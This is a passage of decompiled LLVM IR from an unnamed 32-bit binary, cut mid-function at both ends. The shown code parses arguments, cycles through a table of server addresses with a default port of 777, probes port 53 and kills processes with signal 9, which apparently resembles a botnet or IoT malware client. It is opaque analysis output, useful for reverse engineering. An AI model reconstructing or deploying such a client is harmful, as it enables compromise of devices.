  %storemerge5 = phi i32 [ 10, %dec_label_pc_eb90 ], [ %v2_eb84, %dec_label_pc_eb74 ]
  %v2_ebac = call i32 @function_11e90(i32 %v2_eaf0, i32 44)
  %v2_ebb4 = icmp eq i32 %v2_ebac, 0
  br i1 %v2_ebb4, label %dec_label_pc_ec48, label %dec_label_pc_ebbc

dec_label_pc_ebbc:                                ; preds = %dec_label_pc_eb98
  store i32 %v2_eaf0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_ebc8 = call i32 @function_12340(i32 %v2_eaf0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_ec3c25 = icmp eq i32 %v2_ebc8, 0
  br i1 %v2_ec3c25, label %dec_label_pc_ec94, label %dec_label_pc_ebd8

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebbc, %dec_label_pc_ec24
  %storemerge1226 = phi i32 [ %v2_ec2c, %dec_label_pc_ec24 ], [ %v2_ebc8, %dec_label_pc_ebbc ]
  %v0_ebd8 = call i32 @function_a058()
  %v2_ebe0 = icmp eq i32 %v0_ebd8, 0
  br i1 %v2_ebe0, label %dec_label_pc_ebe8, label %dec_label_pc_ec24

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebd8
  %v6_ec08 = call i32 @function_cea0(i32 %storemerge1226, i32 %v2_eb08, i32 %v2_eb24, i32 %v2_eb40, i32 %v2_eb5c, i32 %storemerge5)
  %v2_ec10 = load i32, i32* @global_var_205d0.63, align 4
  %v1_ec18 = call i32 @function_10678(i32 %v2_ec10)
  %v1_ec20 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ebd8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_ec2c = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_ec3c = icmp eq i32 %v2_ec2c, 0
  br i1 %v2_ec3c, label %dec_label_pc_ec94, label %dec_label_pc_ebd8

dec_label_pc_ec48:                                ; preds = %dec_label_pc_eb98
  %v0_ec48 = call i32 @function_a058()
  %v2_ec50 = icmp eq i32 %v0_ec48, 0
  br i1 %v2_ec50, label %dec_label_pc_ec58, label %dec_label_pc_f0c4

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec48
  %v6_ec78 = call i32 @function_cea0(i32 %v2_eaf0, i32 %v2_eb08, i32 %v2_eb24, i32 %v2_eb40, i32 %v2_eb5c, i32 %storemerge5)
  %v2_ec80 = load i32, i32* @global_var_205d0.63, align 4
  %v1_ec88 = call i32 @function_10678(i32 %v2_ec80)
  %v1_ec90 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec24, %dec_label_pc_ebbc, %dec_label_pc_e9c4
  %v2_ec98 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16de4.145 to i32), i32* @r1, align 4
  %v3_eca4 = inttoptr i32 %v2_ec98 to i8*
  %v4_eca4 = call i32 @function_11e10(i8* %v3_eca4, i32 ptrtoint ([4 x i8]* @global_var_16de4.145 to i32))
  %v2_ecac = icmp eq i32 %v4_eca4, 0
  br i1 %v2_ecac, label %dec_label_pc_ecb4, label %dec_label_pc_ef84

dec_label_pc_ecb4:                                ; preds = %dec_label_pc_ec94
  %v7_ecbc = icmp slt i32 %arg1, 6
  br i1 %v7_ecbc, label %dec_label_pc_f0c4, label %dec_label_pc_ecc0

dec_label_pc_ecc0:                                ; preds = %dec_label_pc_ecb4
  %v1_ecc4 = add i32 %tmp, 12
  %v1_ecc8 = inttoptr i32 %v1_ecc4 to i32*
  %v2_ecc8 = load i32, i32* %v1_ecc8, align 4
  %v1_ecd0 = inttoptr i32 %v2_ecc8 to i8*
  %v2_ecd0 = call i32 @function_13220(i8* %v1_ecd0)
  %v7_ecd8 = icmp eq i32 %v2_ecd0, -1
  br i1 %v7_ecd8, label %dec_label_pc_f0c4, label %dec_label_pc_ece0

dec_label_pc_ece0:                                ; preds = %dec_label_pc_ecc0
  %v1_ece4 = add i32 %tmp, 8
  %v1_ece8 = inttoptr i32 %v1_ece4 to i32*
  %v2_ece8 = load i32, i32* %v1_ece8, align 4
  %v1_ecf0 = inttoptr i32 %v2_ece8 to i8*
  %v2_ecf0 = call i32 @function_13220(i8* %v1_ecf0)
  %v7_ecf8 = icmp eq i32 %v2_ecf0, -1
  br i1 %v7_ecf8, label %dec_label_pc_f0c4, label %dec_label_pc_ed00

dec_label_pc_ed00:                                ; preds = %dec_label_pc_ece0
  %v1_ed04 = add i32 %tmp, 16
  %v1_ed08 = inttoptr i32 %v1_ed04 to i32*
  %v2_ed08 = load i32, i32* %v1_ed08, align 4
  %v1_ed10 = inttoptr i32 %v2_ed08 to i8*
  %v2_ed10 = call i32 @function_13220(i8* %v1_ed10)
  %v7_ed18 = icmp eq i32 %v2_ed10, -1
  br i1 %v7_ed18, label %dec_label_pc_f0c4, label %dec_label_pc_ed20

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ed00
  %v2_ed28 = load i32, i32* %v1_ed08, align 4
  %v1_ed30 = inttoptr i32 %v2_ed28 to i8*
  %v2_ed30 = call i32 @function_13220(i8* %v1_ed30)
  %v8_ed3c = icmp sgt i32 %v2_ed30, 32
  br i1 %v8_ed3c, label %dec_label_pc_f0c4, label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed20
  %v7_ed48 = icmp slt i32 %arg1, 7
  br i1 %v7_ed48, label %dec_label_pc_ed6c, label %dec_label_pc_ed4c

dec_label_pc_ed4c:                                ; preds = %dec_label_pc_ed40
  %v1_ed50 = add i32 %tmp, 24
  %v1_ed54 = inttoptr i32 %v1_ed50 to i32*
  %v2_ed54 = load i32, i32* %v1_ed54, align 4
  %v1_ed5c = inttoptr i32 %v2_ed54 to i8*
  %v2_ed5c = call i32 @function_13220(i8* %v1_ed5c)
  %v1_ed64 = icmp slt i32 %v2_ed5c, 0
  br i1 %v1_ed64, label %dec_label_pc_f0c4, label %dec_label_pc_ed6c

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed4c, %dec_label_pc_ed40
  %v7_ed70 = icmp eq i32 %arg1, 8
  br i1 %v7_ed70, label %dec_label_pc_ed78, label %dec_label_pc_ed9c

dec_label_pc_ed78:                                ; preds = %dec_label_pc_ed6c
  %v1_ed7c = add i32 %tmp, 28
  %v1_ed80 = inttoptr i32 %v1_ed7c to i32*
  %v2_ed80 = load i32, i32* %v1_ed80, align 4
  %v1_ed88 = inttoptr i32 %v2_ed80 to i8*
  %v2_ed88 = call i32 @function_13220(i8* %v1_ed88)
  %v5_ed94 = icmp sgt i32 %v2_ed88, 0
  br i1 %v5_ed94, label %dec_label_pc_ed9c, label %dec_label_pc_f0c4

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed6c, %dec_label_pc_ed78
  %v1_eda0 = add i32 %tmp, 4
  %v1_eda4 = inttoptr i32 %v1_eda0 to i32*
  %v2_eda4 = load i32, i32* %v1_eda4, align 4
  %v2_edb4 = load i32, i32* %v1_ece8, align 4
  %v1_edbc = inttoptr i32 %v2_edb4 to i8*
  %v2_edbc = call i32 @function_13220(i8* %v1_edbc)
  %v2_edd0 = load i32, i32* %v1_ecc8, align 4
  %v1_edd8 = inttoptr i32 %v2_edd0 to i8*
  %v2_edd8 = call i32 @function_13220(i8* %v1_edd8)
  %v2_edec = load i32, i32* %v1_ed08, align 4
  %v1_edf4 = inttoptr i32 %v2_edec to i8*
  %v2_edf4 = call i32 @function_13220(i8* %v1_edf4)
  %v1_ee04 = add i32 %tmp, 20
  %v1_ee08 = inttoptr i32 %v1_ee04 to i32*
  %v2_ee08 = load i32, i32* %v1_ee08, align 4
  br i1 %v7_ed70, label %dec_label_pc_ee1c, label %dec_label_pc_ee38

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ed9c
  %v1_ee20 = add i32 %tmp, 28
  %v1_ee24 = inttoptr i32 %v1_ee20 to i32*
  %v2_ee24 = load i32, i32* %v1_ee24, align 4
  %v1_ee2c = inttoptr i32 %v2_ee24 to i8*
  %v2_ee2c = call i32 @function_13220(i8* %v1_ee2c)
  br label %dec_label_pc_ee40

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ed9c
  br label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_ee1c, %dec_label_pc_ee38
  %storemerge3 = phi i32 [ 10, %dec_label_pc_ee38 ], [ %v2_ee2c, %dec_label_pc_ee1c ]
  br i1 %v7_ed48, label %dec_label_pc_ee70, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee40
  %v1_ee58 = add i32 %tmp, 24
  %v1_ee5c = inttoptr i32 %v1_ee58 to i32*
  %v2_ee5c = load i32, i32* %v1_ee5c, align 4
  %v1_ee64 = inttoptr i32 %v2_ee5c to i8*
  %v2_ee64 = call i32 @function_13220(i8* %v1_ee64)
  br label %dec_label_pc_ee78

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee40
  br label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee54, %dec_label_pc_ee70
  %storemerge2 = phi i32 [ 0, %dec_label_pc_ee70 ], [ %v2_ee64, %dec_label_pc_ee54 ]
  %v2_ee8c = call i32 @function_11e90(i32 %v2_eda4, i32 44)
  %v2_ee94 = icmp eq i32 %v2_ee8c, 0
  br i1 %v2_ee94, label %dec_label_pc_ef30, label %dec_label_pc_ee9c

dec_label_pc_ee9c:                                ; preds = %dec_label_pc_ee78
  store i32 %v2_eda4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_eea8 = call i32 @function_12340(i32 %v2_eda4, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_ef2422 = icmp eq i32 %v2_eea8, 0
  br i1 %v2_ef2422, label %dec_label_pc_ef84, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_ee9c, %dec_label_pc_ef0c
  %storemerge1023 = phi i32 [ %v2_ef14, %dec_label_pc_ef0c ], [ %v2_eea8, %dec_label_pc_ee9c ]
  %v0_eeb8 = call i32 @function_a058()
  %v2_eec0 = icmp eq i32 %v0_eeb8, 0
  br i1 %v2_eec0, label %dec_label_pc_eec8, label %dec_label_pc_ef0c

dec_label_pc_eec8:                                ; preds = %dec_label_pc_eeb8
  %v7_eef0 = call i32 @function_d4b4(i32 %storemerge1023, i32 %v2_edbc, i32 %v2_edd8, i32 %v2_edf4, i32 %v2_ee08, i32 %storemerge2, i32 %storemerge3)
  %v2_eef8 = load i32, i32* @global_var_205d0.63, align 4
  %v1_ef00 = call i32 @function_10678(i32 %v2_eef8)
  %v1_ef08 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_eeb8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_ef14 = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  %v2_ef24 = icmp eq i32 %v2_ef14, 0
  br i1 %v2_ef24, label %dec_label_pc_ef84, label %dec_label_pc_eeb8

dec_label_pc_ef30:                                ; preds = %dec_label_pc_ee78
  %v0_ef30 = call i32 @function_a058()
  %v2_ef38 = icmp eq i32 %v0_ef30, 0
  br i1 %v2_ef38, label %dec_label_pc_ef40, label %dec_label_pc_f0c4

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef30
  %v7_ef68 = call i32 @function_d4b4(i32 %v2_eda4, i32 %v2_edbc, i32 %v2_edd8, i32 %v2_edf4, i32 %v2_ee08, i32 %storemerge2, i32 %storemerge3)
  %v2_ef70 = load i32, i32* @global_var_205d0.63, align 4
  %v1_ef78 = call i32 @function_10678(i32 %v2_ef70)
  %v1_ef80 = call i32 @function_10624(i32 0)
  unreachable

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_ee9c, %dec_label_pc_ec94
  %v2_ef88 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16de8.147 to i32), i32* @r1, align 4
  %v3_ef94 = inttoptr i32 %v2_ef88 to i8*
  %v4_ef94 = call i32 @function_11e10(i8* %v3_ef94, i32 ptrtoint ([9 x i8]* @global_var_16de8.147 to i32))
  %v2_ef9c = icmp eq i32 %v4_ef94, 0
  br i1 %v2_ef9c, label %dec_label_pc_efa4, label %dec_label_pc_f09c

dec_label_pc_efa4:                                ; preds = %dec_label_pc_ef84
  br label %dec_label_pc_f048

dec_label_pc_efb8:                                ; preds = %dec_label_pc_f048, %dec_label_pc_f07c
  %v3_efbc = mul i32 %storemerge8, 4
  %v2_efc8 = load i32, i32* @global_var_26654.70, align 4
  %v2_efcc = add i32 %v2_efc8, %v3_efbc
  %v1_efd0 = inttoptr i32 %v2_efcc to i32*
  %v2_efd0 = load i32, i32* %v1_efd0, align 4
  %v2_efd4 = icmp eq i32 %v2_efd0, 0
  br i1 %v2_efd4, label %dec_label_pc_f03c, label %dec_label_pc_efdc

dec_label_pc_efdc:                                ; preds = %dec_label_pc_efb8
  %v2_eff4 = load i32, i32* %v1_efd0, align 4
  store i32 %v2_eff4, i32* @r4, align 4
  %v0_eff8 = call i32 @function_10724()
  %v0_f000 = load i32, i32* @r4, align 4
  %v9_f000 = icmp eq i32 %v0_f000, %v0_eff8
  br i1 %v9_f000, label %dec_label_pc_f03c, label %dec_label_pc_f008

dec_label_pc_f008:                                ; preds = %dec_label_pc_efdc
  %v2_f018 = load i32, i32* @global_var_26654.70, align 4
  %v2_f01c = add i32 %v2_f018, %v3_efbc
  %v1_f020 = inttoptr i32 %v2_f01c to i32*
  %v2_f020 = load i32, i32* %v1_f020, align 4
  %v2_f02c = call i32 @function_107cc(i32 %v2_f020, i32 9)
  %v1_f034 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_efdc, %dec_label_pc_efb8, %dec_label_pc_f008
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_efb8 ], [ %stack_var_-28.1, %dec_label_pc_efdc ], [ %v1_f034, %dec_label_pc_f008 ]
  %v1_f040 = add i32 %storemerge8, 1
  br label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_efa4, %dec_label_pc_f03c
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_efa4 ], [ %stack_var_-28.0, %dec_label_pc_f03c ]
  %storemerge8 = phi i32 [ 0, %dec_label_pc_efa4 ], [ %v1_f040, %dec_label_pc_f03c ]
  %v5_f060 = load i32, i32* @global_var_205dc.68, align 4
  %v9_f074 = icmp eq i32 %v5_f060, 0
  br i1 %v9_f074, label %dec_label_pc_f07c, label %dec_label_pc_efb8

dec_label_pc_f07c:                                ; preds = %dec_label_pc_f048
  %v2_f060 = load i32, i32* @global_var_205d8.67, align 4
  %tmp94 = icmp ugt i32 %v2_f060, %storemerge8
  br i1 %tmp94, label %dec_label_pc_efb8, label %dec_label_pc_f09c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f07c, %dec_label_pc_ef84
  %v2_f0a0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_16df4.151 to i32), i32* @r1, align 4
  %v3_f0ac = inttoptr i32 %v2_f0a0 to i8*
  %v4_f0ac = call i32 @function_11e10(i8* %v3_f0ac, i32 ptrtoint ([10 x i8]* @global_var_16df4.151 to i32))
  %v2_f0b4 = icmp eq i32 %v4_f0ac, 0
  br i1 %v2_f0b4, label %dec_label_pc_f0bc, label %dec_label_pc_f0c4

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f09c
  %v1_f0c0 = call i32 @function_133cc(i32 0)
  br label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_ed78, %dec_label_pc_eac4, %dec_label_pc_e88c, %dec_label_pc_e708, %dec_label_pc_e808, %dec_label_pc_e98c, %dec_label_pc_ec48, %dec_label_pc_ef30, %dec_label_pc_f09c, %dec_label_pc_ed4c, %dec_label_pc_ed20, %dec_label_pc_ed00, %dec_label_pc_ece0, %dec_label_pc_ecc0, %dec_label_pc_ecb4, %dec_label_pc_ea98, %dec_label_pc_ea70, %dec_label_pc_ea50, %dec_label_pc_ea30, %dec_label_pc_ea10, %dec_label_pc_e9f0, %dec_label_pc_e9e4, %dec_label_pc_e86c, %dec_label_pc_e860, %dec_label_pc_e6e8, %dec_label_pc_e6dc, %dec_label_pc_e690, %dec_label_pc_e658, %dec_label_pc_f0bc
  %v12_f0c8 = phi i32 [ %v2_ed88, %dec_label_pc_ed78 ], [ %v2_ead4, %dec_label_pc_eac4 ], [ %v2_e89c, %dec_label_pc_e88c ], [ %v2_e718, %dec_label_pc_e708 ], [ %v0_e808, %dec_label_pc_e808 ], [ %v0_e98c, %dec_label_pc_e98c ], [ %v0_ec48, %dec_label_pc_ec48 ], [ %v0_ef30, %dec_label_pc_ef30 ], [ %v4_f0ac, %dec_label_pc_f09c ], [ %v2_ed5c, %dec_label_pc_ed4c ], [ %v2_ed30, %dec_label_pc_ed20 ], [ %v2_ed10, %dec_label_pc_ed00 ], [ %v2_ecf0, %dec_label_pc_ece0 ], [ %v2_ecd0, %dec_label_pc_ecc0 ], [ 0, %dec_label_pc_ecb4 ], [ %v2_eaa8, %dec_label_pc_ea98 ], [ %v2_ea80, %dec_label_pc_ea70 ], [ %v2_ea60, %dec_label_pc_ea50 ], [ %v2_ea40, %dec_label_pc_ea30 ], [ %v2_ea20, %dec_label_pc_ea10 ], [ %v2_ea00, %dec_label_pc_e9f0 ], [ 0, %dec_label_pc_e9e4 ], [ %v2_e87c, %dec_label_pc_e86c ], [ 0, %dec_label_pc_e860 ], [ %v2_e6f8, %dec_label_pc_e6e8 ], [ 0, %dec_label_pc_e6dc ], [ %v3_e6b4, %dec_label_pc_e690 ], [ %v3_e668, %dec_label_pc_e658 ], [ %v1_f0c0, %dec_label_pc_f0bc ]
  store i32 %v3_e624, i32* @r4, align 4
  store i32 %v6_e624, i32* @fp, align 4
  ret i32 %v12_f0c8

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v3_efbc, { 1, 0 }
  uselistorder i32 %v2_ef14, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v2_edf4, { 1, 0 }
  uselistorder i32 %v2_edd8, { 1, 0 }
  uselistorder i32 %v2_edbc, { 1, 0 }
  uselistorder i32 %v2_eda4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_ed10, { 1, 0 }
  uselistorder i32 %v2_ecf0, { 1, 0 }
  uselistorder i32 %v2_ecd0, { 1, 0 }
  uselistorder i32 %v2_ec2c, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_eb40, { 1, 0 }
  uselistorder i32 %v2_eb24, { 1, 0 }
  uselistorder i32 %v2_eb08, { 1, 0 }
  uselistorder i32 %v2_eaf0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_ea60, { 1, 0 }
  uselistorder i32 %v2_ea40, { 1, 0 }
  uselistorder i32 %v2_ea20, { 1, 0 }
  uselistorder i32 %v2_ea00, { 1, 0 }
  uselistorder i32 %v2_e970, { 1, 0 }
  uselistorder i32 %v2_e8ec, { 1, 0 }
  uselistorder i32 %v2_e8d0, { 1, 0 }
  uselistorder i32 %v2_e8b8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_e7ec, { 1, 0 }
  uselistorder i32 %v2_e768, { 1, 0 }
  uselistorder i32 %v2_e74c, { 1, 0 }
  uselistorder i32 %v2_e734, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_d4b4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_cea0, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_db48, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_e060, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16d84.114 to i32), { 3, 10, 4, 11, 2, 12, 5, 13, 1, 14, 6, 15, 0, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_16d40.65 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_f0c4, { 28, 8, 7, 0, 9, 10, 11, 12, 13, 14, 6, 1, 15, 16, 17, 18, 19, 20, 21, 5, 2, 22, 23, 4, 3, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_f048, { 1, 0 }
  uselistorder label %dec_label_pc_f03c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_efb8, { 1, 0 }
  uselistorder label %dec_label_pc_eeb8, { 1, 0 }
  uselistorder label %dec_label_pc_ee78, { 1, 0 }
  uselistorder label %dec_label_pc_ee40, { 1, 0 }
  uselistorder label %dec_label_pc_ed9c, { 1, 0 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_eb98, { 1, 0 }
  uselistorder label %dec_label_pc_eae8, { 1, 0 }
  uselistorder label %dec_label_pc_e930, { 1, 0 }
  uselistorder label %dec_label_pc_e7ac, { 1, 0 }
}

define i32 @function_f108() local_unnamed_addr {
dec_label_pc_f108:
  %stack_var_-532 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_f10c = load i32, i32* @fp, align 4
  store i32 61716, i32* %stack_var_-4, align 4
  %v2_f110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f110, i32* @fp, align 4
  %v2_f118 = ptrtoint i32* %stack_var_-532 to i32
  store i32 512, i32* @r2, align 4
  %v2_f128 = bitcast i32* %stack_var_-532 to i8*
  %v3_f128 = call i32 @function_11d70(i8* %v2_f128, i32 0)
  %v2_f130 = load i32, i32* @global_var_205d0.63, align 4
  %v2_f134 = icmp eq i32 %v2_f130, 0
  br i1 %v2_f134, label %dec_label_pc_f158, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f108
  %v1_f148 = call i32 @function_10678(i32 %v2_f130)
  store i32 0, i32* @global_var_205d0.63, align 4
  br label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f108, %dec_label_pc_f13c
  %v2_f15c = load i32, i32* @global_var_20224.154, align 4
  %v2_f160 = icmp eq i32 %v2_f15c, 0
  br i1 %v2_f160, label %dec_label_pc_f18c, label %dec_label_pc_f178

dec_label_pc_f178:                                ; preds = %dec_label_pc_f158
  %v1_f180 = add i32 %v2_f15c, 1
  br label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f158, %dec_label_pc_f178
  %storemerge1 = phi i32 [ %v1_f180, %dec_label_pc_f178 ], [ 0, %dec_label_pc_f158 ]
  store i32 %storemerge1, i32* @global_var_20224.154, align 4
  %v4_f19c = mul i32 %storemerge1, 4
  %v5_f19c = add i32 %v4_f19c, ptrtoint ([17 x i8]** @global_var_20220.157 to i32)
  %v6_f19c = inttoptr i32 %v5_f19c to i32*
  %v7_f19c = load i32, i32* %v6_f19c, align 4
  %v2_f1a8 = inttoptr i32 %v7_f19c to i8*
  %v3_f1a8 = call i32 @function_11f98(i32 %v2_f118, i8* %v2_f1a8)
  %v2_f1c4 = call i32 @function_11e90(i32 %v2_f118, i32 58)
  %v2_f1cc = icmp eq i32 %v2_f1c4, 0
  br i1 %v2_f1cc, label %dec_label_pc_f21c, label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f18c
  %v2_f1e0 = call i32 @function_11e90(i32 %v2_f118, i32 58)
  %v1_f1e8 = add i32 %v2_f1e0, 1
  %v1_f1f0 = inttoptr i32 %v1_f1e8 to i8*
  %v2_f1f0 = call i32 @function_13220(i8* %v1_f1f0)
  %v2_f208 = call i32 @function_11e90(i32 %v2_f118, i32 58)
  %v3_f218 = inttoptr i32 %v2_f208 to i8*
  store i8 0, i8* %v3_f218, align 1
  br label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f18c, %dec_label_pc_f1d4
  %stack_var_-20.0 = phi i32 [ 777, %dec_label_pc_f18c ], [ %v2_f1f0, %dec_label_pc_f1d4 ]
  %v3_f228 = call i32 @function_1263c(i32 2, i32 1, i32 0)
  store i32 %v3_f228, i32* @global_var_205d0.63, align 4
  %v4_f254 = call i32 @function_9dd8(i32 %v3_f228, i32 %v2_f118, i32 %stack_var_-20.0, i32 30)
  %v2_f25c = icmp eq i32 %v4_f254, 0
  %. = zext i1 %v2_f25c to i32
  store i32 %v3_f10c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_f118, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 30, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 (i32, i32)* @function_11e90, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f21c, { 1, 0 }
  uselistorder label %dec_label_pc_f18c, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
}

define i32 @function_f294(i32 %arg1) local_unnamed_addr {
dec_label_pc_f294:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f298 = load i32, i32* @fp, align 4
  store i32 %v3_f298, i32* %stack_var_-16, align 4
  %v3_f2b4 = call i32 @function_1263c(i32 2, i32 2, i32 0)
  %v3_f2c4 = icmp eq i32 %v3_f2b4, -1
  br i1 %v3_f2c4, label %dec_label_pc_f2cc, label %dec_label_pc_f2dc

dec_label_pc_f2cc:                                ; preds = %dec_label_pc_f294
  br label %dec_label_pc_f544

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f294
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_16e00.159 to i32), i32* @r0, align 4
  %v2_f320 = call i32 @function_124d4(i32 ptrtoint ([8 x i8]* @global_var_16e00.159 to i32))
  %v1_f330 = call i32 @function_12434(i32 53)
  %v3_f354 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_f354 = call i32 @function_124f8(i32 %v3_f2b4, %sockaddr* %v3_f354, i32 16)
  %v3_f364 = icmp eq i32 %v4_f354, -1
  br i1 %v3_f364, label %dec_label_pc_f36c, label %dec_label_pc_f37c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f2dc
  br label %dec_label_pc_f544

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f2dc
  store i32 16, i32* %stack_var_-72, align 4
  %v2_f384 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f388 = ptrtoint i32* %stack_var_-72 to i32
  %v5_f394 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_f394 = call i32 @function_12524(i32 %v3_f2b4, %sockaddr* %v5_f394, i32 %v2_f388, i32 %v2_f384, i32 16)
  %v3_f3a4 = icmp eq i32 %v6_f394, -1
  br i1 %v3_f3a4, label %dec_label_pc_f3ac, label %dec_label_pc_f3bc

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f37c
  br label %dec_label_pc_f544

dec_label_pc_f3bc:                                ; preds = %dec_label_pc_f37c
  store i32 ptrtoint (i32* @global_var_2664c.76 to i32), i32* @r2, align 4
  %v4_f3d0 = call i32 @function_107f8(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_16e08.162, i32 0, i32 0), i32 0)
  %v2_f468 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_f460

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f460
  %v4_f3f4 = call i32 @function_1214c(i32 %v2_f468, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_16e18.164, i32 0, i32 0))
  %v2_f3fc = icmp eq i32 %v4_f3f4, 0
  br i1 %v2_f3fc, label %dec_label_pc_f444, label %dec_label_pc_f424.preheader

dec_label_pc_f424.preheader:                      ; preds = %dec_label_pc_f3e0
  %v2_f4289 = load i8, i8* %stack_var_-4168, align 1
  %v7_f42c13 = icmp eq i8 %v2_f4289, 9
  br i1 %v7_f42c13, label %dec_label_pc_f434, label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f424.preheader, %dec_label_pc_f418
  %v4_f42414 = phi i32 [ %v1_f41c, %dec_label_pc_f418 ], [ %v2_f468, %dec_label_pc_f424.preheader ]
  %v1_f41c = add i32 %v4_f42414, 1
  %v5_f420 = inttoptr i32 %v1_f41c to i8*
  %v2_f428 = load i8, i8* %v5_f420, align 1
  %v7_f42c = icmp eq i8 %v2_f428, 9
  br i1 %v7_f42c, label %dec_label_pc_f434, label %dec_label_pc_f418

dec_label_pc_f434:                                ; preds = %dec_label_pc_f418, %dec_label_pc_f424.preheader
